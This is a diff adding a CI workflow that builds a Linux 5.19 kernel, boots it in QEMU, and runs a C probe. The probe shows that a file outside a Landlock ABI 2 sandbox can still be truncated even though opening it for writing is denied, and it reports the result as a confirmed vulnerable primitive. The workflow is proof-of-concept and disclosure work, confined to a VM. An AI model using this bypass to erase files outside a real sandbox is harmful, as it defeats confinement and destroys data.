@@ -1,0 +1,146 @@
+name: Landlock ABI 2 runtime proof
+
+on:
+  push:
+    branches:
+      - security/landlock-abi2-runtime-probe
+    paths:
+      - .github/workflows/landlock-abi2-runtime-proof.yml
+
+permissions:
+  contents: read
+
+jobs:
+  abi2-qemu:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 25
+    steps:
+      - name: Install kernel build and QEMU tools
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential bc bison flex libssl-dev libelf-dev qemu-system-x86 cpio gzip
+
+      - name: Build Linux 5.19 kernel with Landlock
+        run: |
+          set -euxo pipefail
+          curl -fsSLO https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.19.17.tar.xz
+          tar -xf linux-5.19.17.tar.xz
+          cd linux-5.19.17
+          make defconfig
+          scripts/config --enable SECURITY --enable SECURITY_LANDLOCK --set-str LSM "landlock"
+          make olddefconfig
+          grep -E '^(CONFIG_SECURITY|CONFIG_SECURITY_LANDLOCK)=y$|^CONFIG_LSM="landlock"$' .config
+          make -j"$(nproc)" bzImage
+          mkdir -p "$GITHUB_WORKSPACE/kernel"
+          cp arch/x86/boot/bzImage "$GITHUB_WORKSPACE/kernel/bzImage"
+
+      - name: Build static Landlock ABI 2 proof program and initramfs
+        run: |
+          set -euxo pipefail
+          cat > probe.c <<'EOF'
+          #define _GNU_SOURCE
+          #include <errno.h>
+          #include <fcntl.h>
+          #include <linux/landlock.h>
+          #include <linux/reboot.h>
+          #include <stdio.h>
+          #include <string.h>
+          #include <sys/prctl.h>
+          #include <sys/reboot.h>
+          #include <sys/stat.h>
+          #include <sys/syscall.h>
+          #include <unistd.h>
+
+          #define DIE(msg) do { dprintf(1, "FAIL: %s: %s\\n", msg, strerror(errno)); goto out; } while (0)
+
+          int main(void) {
+              int rc = 1, ruleset_fd = -1, allowed_fd = -1, victim_fd = -1;
+              struct landlock_ruleset_attr attr = {0};
+              struct landlock_path_beneath_attr rule = {0};
+              struct stat st;
+              long abi = syscall(SYS_landlock_create_ruleset, NULL, 0,
+                                 LANDLOCK_CREATE_RULESET_VERSION);
+              dprintf(1, "LANDLOCK_ABI=%ld\\n", abi);
+              if (abi != 2) { dprintf(1, "FAIL: expected ABI 2\\n"); goto out; }
+
+              mkdir("/allowed", 0700);
+              mkdir("/outside", 0700);
+              victim_fd = open("/outside/victim", O_CREAT | O_WRONLY | O_TRUNC, 0600);
+              if (victim_fd < 0) DIE("create victim");
+              if (write(victim_fd, "proof-data", 10) != 10) DIE("write victim");
+              close(victim_fd); victim_fd = -1;
+
+              attr.handled_access_fs =
+                  LANDLOCK_ACCESS_FS_EXECUTE | LANDLOCK_ACCESS_FS_WRITE_FILE |
+                  LANDLOCK_ACCESS_FS_READ_FILE | LANDLOCK_ACCESS_FS_READ_DIR |
+                  LANDLOCK_ACCESS_FS_REMOVE_DIR | LANDLOCK_ACCESS_FS_REMOVE_FILE |
+                  LANDLOCK_ACCESS_FS_MAKE_CHAR | LANDLOCK_ACCESS_FS_MAKE_DIR |
+                  LANDLOCK_ACCESS_FS_MAKE_REG | LANDLOCK_ACCESS_FS_MAKE_SOCK |
+                  LANDLOCK_ACCESS_FS_MAKE_FIFO | LANDLOCK_ACCESS_FS_MAKE_BLOCK |
+                  LANDLOCK_ACCESS_FS_MAKE_SYM | LANDLOCK_ACCESS_FS_REFER;
+              ruleset_fd = syscall(SYS_landlock_create_ruleset, &attr, sizeof(attr), 0);
+              if (ruleset_fd < 0) DIE("create ABI 2 ruleset");
+              allowed_fd = open("/allowed", O_PATH | O_CLOEXEC);
+              if (allowed_fd < 0) DIE("open allowed directory");
+              rule.allowed_access = attr.handled_access_fs;
+              rule.parent_fd = allowed_fd;
+              if (syscall(SYS_landlock_add_rule, ruleset_fd,
+                          LANDLOCK_RULE_PATH_BENEATH, &rule, 0) < 0)
+                  DIE("add allowed path rule");
+              if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) DIE("no_new_privs");
+              if (syscall(SYS_landlock_restrict_self, ruleset_fd, 0) < 0)
+                  DIE("restrict self");
+
+              errno = 0;
+              int denied_fd = open("/outside/victim", O_WRONLY | O_TRUNC);
+              dprintf(1, "OUTSIDE_WRITE_OPEN=%s errno=%d\\n",
+                      denied_fd < 0 ? "DENIED" : "ALLOWED", errno);
+              if (denied_fd >= 0) close(denied_fd);
+
+              errno = 0;
+              int trunc_rc = truncate("/outside/victim", 0);
+              dprintf(1, "OUTSIDE_TRUNCATE=%s errno=%d\\n",
+                      trunc_rc == 0 ? "SUCCEEDED" : "DENIED", errno);
+              if (trunc_rc != 0) goto out;
+              if (stat("/outside/victim", &st) < 0) DIE("stat victim");
+              dprintf(1, "OUTSIDE_FILE_SIZE=%ld\\n", (long)st.st_size);
+              if (st.st_size != 0) goto out;
+              if (denied_fd >= 0) goto out;
+              dprintf(1, "RESULT=VULNERABLE_PRIMITIVE_CONFIRMED\\n");
+              rc = 0;
+          out:
+              if (victim_fd >= 0) close(victim_fd);
+              if (allowed_fd >= 0) close(allowed_fd);
+              if (ruleset_fd >= 0) close(ruleset_fd);
+              syscall(SYS_reboot, LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
+                      LINUX_REBOOT_CMD_POWER_OFF, NULL);
+              return rc;
+          }
+          EOF
+          gcc -static -O2 -Wall -Wextra probe.c -o probe
+          mkdir -p initramfs
+          cp probe initramfs/init
+          chmod 0755 initramfs/init
+          (cd initramfs && find . -print0 | cpio --null -o --format=newc | gzip -9) > initramfs.cpio.gz
+
+      - name: Boot ABI 2 guest and verify out-of-path truncation
+        run: |
+          set -euxo pipefail
+          timeout 120s qemu-system-x86_64 \
+            -machine accel=tcg -cpu max -m 1024 -smp 2 \
+            -kernel kernel/bzImage -initrd initramfs.cpio.gz \
+            -append "console=ttyS0 panic=-1" -nographic -monitor none -no-reboot \
+            2>&1 | tee qemu.log
+          grep -q 'LANDLOCK_ABI=2' qemu.log
+          grep -q 'OUTSIDE_WRITE_OPEN=DENIED' qemu.log
+          grep -q 'OUTSIDE_TRUNCATE=SUCCEEDED' qemu.log
+          grep -q 'OUTSIDE_FILE_SIZE=0' qemu.log
+          grep -q 'RESULT=VULNERABLE_PRIMITIVE_CONFIRMED' qemu.log
+
+      - name: Upload proof log
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: landlock-abi2-qemu-proof
+          path: qemu.log
+          if-no-files-found: ignore
